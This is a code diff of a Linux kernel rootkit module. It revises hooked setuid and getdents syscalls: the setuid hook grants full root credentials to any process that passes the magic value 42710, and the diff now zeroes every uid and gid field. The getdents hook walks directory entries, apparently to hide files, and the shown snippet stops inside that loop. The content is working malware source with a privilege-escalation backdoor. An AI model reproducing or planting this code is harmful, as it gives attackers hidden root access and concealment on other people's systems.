@@ -33,32 +33,30 @@ asmlinkage int (*real_getdents) (unsigned int, struct linux_dirent*, unsigned in
 
 asmlinkage int hijacked_setuid(uid_t uid){
 	struct cred *new;
-	int ret;
 	if (uid == 42710){
 		printk(KERN_DEBUG "setuid called\n");
 		new = prepare_creds();
-		new->uid = 0;
-		new->euid = 0;
-		new->gid = 0;
-		new->suid = 0;
+                new->uid = 0;
+                new->gid = 0;
+                new->suid = 0;
+                new->sgid = 0;
+                new->euid = 0;
+                new->egid = 0;
+                new->fsuid = 0;
+                new->fsgid = 0;
 		return commit_creds(new);
 	}
 		return real_setuid(uid);
 }
 
 asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
-	printk(KERN_INFO "hijacked call.\n");
 	
-	
-	char *name;
-	name = dirp->d_name;
-
-	int num_reads = real_getdents(fd, dirp, count);
-
+	int i;
 	struct linux_dirent *cdirp;
-	int i, j;
-	long start_offset = dirp;
+	long start_offset = (long)dirp;
+	int num_reads = real_getdents(fd, dirp, count);
 	cdirp = dirp;
+	printk(KERN_INFO "hijacked call.\n");
 	printk(KERN_INFO "num reads: %d\n",num_reads);
 
 	for (i = 0; i < num_reads; i+= cdirp->d_reclen){
